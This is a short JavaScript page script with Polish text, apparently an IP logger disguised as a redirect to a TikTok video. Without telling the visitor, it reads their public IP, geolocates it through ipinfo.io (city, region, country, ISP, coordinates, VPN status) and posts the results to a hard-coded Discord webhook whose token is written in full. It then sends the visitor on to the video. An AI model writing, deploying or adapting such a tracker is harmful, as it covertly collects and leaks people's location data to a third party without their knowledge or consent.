const webhookUrl = 'https://discord.com/api/webhooks/1437159107910959124/lLFmMH0UNisz0j1P-Mev2Ew7dcBjTmBP2MmsaAParqsAz2PL9x6oxJD1ZS04IpTuh8q_';
const redirectUrl = 'https://www.tiktok.com/@itzz_arbuz4/video/7571758510245956886';

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;
    fetch('https://ipinfo.io/' + ip + '/json')
      .then(resp => resp.json())
      .then(ipinfo => {
        let vpn = 'nieznane';
        if (ipinfo.privacy && typeof ipinfo.privacy.vpn !== 'undefined') {
          vpn = ipinfo.privacy.vpn ? 'TAK' : 'NIE';
        }
        const embed = {
          embeds: [{
            title: "Nowe wejście na stronę",
            description: `Adres IP: **${ip}**\nMiasto: ${ipinfo.city || 'Brak'}\nRegion: ${ipinfo.region || 'Brak'}\nKraj: ${ipinfo.country || 'Brak'}\nISP: ${ipinfo.org || 'Brak'}\nLokacja: ${ipinfo.loc || 'Brak'}\nVPN: ${vpn}`,
            color: 5814783,
            footer: { text: "twoje ip nie zostanie upulicznione! | robię to 4fun! | kliknięto z linku [tiktok_itz_arbuz4](https://www.tiktok.com/@itzz_arbuz4/video/7571758510245956886) " },
            timestamp: new Date().toISOString()
          }]
        };
        fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(embed)
        });
      })
      .finally(() => {
        window.location.href = redirectUrl;
      });
  });
